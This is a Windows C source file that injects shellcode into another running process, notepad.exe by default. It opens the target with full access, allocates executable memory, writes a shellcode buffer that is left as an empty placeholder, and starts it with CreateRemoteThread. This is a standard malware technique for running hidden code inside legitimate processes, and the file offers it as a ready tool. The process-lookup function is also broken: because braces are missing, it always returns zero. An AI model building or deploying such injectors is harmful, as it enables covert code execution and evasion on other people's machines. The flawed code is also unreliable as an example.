// Author: spasemax0
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

// Function retrieves process ID given the process name
DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
    fprintf(stderr, "Failed to create process snapshot: %d\n", GetLastError());
        return 0;
    DWORD processId = 0;
    if (Process32First(processesSnapshot, &processInfo)) {
        do {
            if (strcmp(processName, processInfo.szExeFile) == 0) {
                processId = processInfo.th32ProcessID;
                break;
            }
        } while (Process32Next(processesSnapshot, &processInfo));
    }

    CloseHandle(processesSnapshot);
    return processId;
}

int main()
{
    char shellcode[] = {};// <-- Shellcode goes here
    size_t shellcodeSize = sizeof(shellcode);
    const char* targetProcessName = "notepad.exe"; // Target process, change as needed
    DWORD pid = GetProcessIdByName(targetProcessName);
    if (pid == 0) {
        fprintf(stderr, "failed to find process '%s'\n", targetProcessName);
        return 1;
    }
    // Open target process
    printf("Process ID of '%s': %u\n", targetProcessName, pid);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid); // Handle that stores the remote process's handle
    if (hProcess == NULL) {
        fprintf(stderr, "failed to open process: %d\n", GetLastError());
        return 2;
    }
    // Allocate memory in target process for shellcode
    void* exec_mem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        fprintf(stderr, "failed to allocate memory: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 3;
    }
    // Write shellcode to allocated memory
    if (!WriteProcessMemory(hProcess, exec_mem, shellcode, shellcodeSize, NULL)) {
        fprintf(stderr, "Failed to write memory: %d\n", GetLastError());
        VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 4;
    }
    // Creating remote thread in target process to execute shellcode
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, 0);
    if (hThread == NULL) {
        fprintf(stderr, "failed to create thread: %d\n", GetLastError());
        VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 5;
    }
    WaitForSingleObject(hThread, INFINITE);
    // Free alocated memory, close thread and handles
    VirtualFreeEx(hProcess, exec_mem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;

}
